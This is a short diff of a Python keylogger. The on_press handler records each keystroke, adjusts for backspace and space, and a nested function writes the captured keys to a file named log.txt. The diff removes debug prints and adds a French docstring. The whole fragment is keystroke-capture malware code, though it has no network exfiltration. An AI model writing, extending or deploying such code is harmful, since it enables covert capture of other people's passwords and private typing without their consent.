@@ -6,15 +6,16 @@ def on_press(key):
     global keys, count
     keys.append(key)
     count += 1
-    print(count)
     if key == Key.backspace:
         keys.pop()
     if key == Key.space:
         key = " "
         keys.append(key)
-    print(format(key))
+
+
 
     def write_file(key1):
+        """Écriture des touches dans un fichier """
         f=open("log.txt", "w+")
         for key in key1:
             f.write(key)
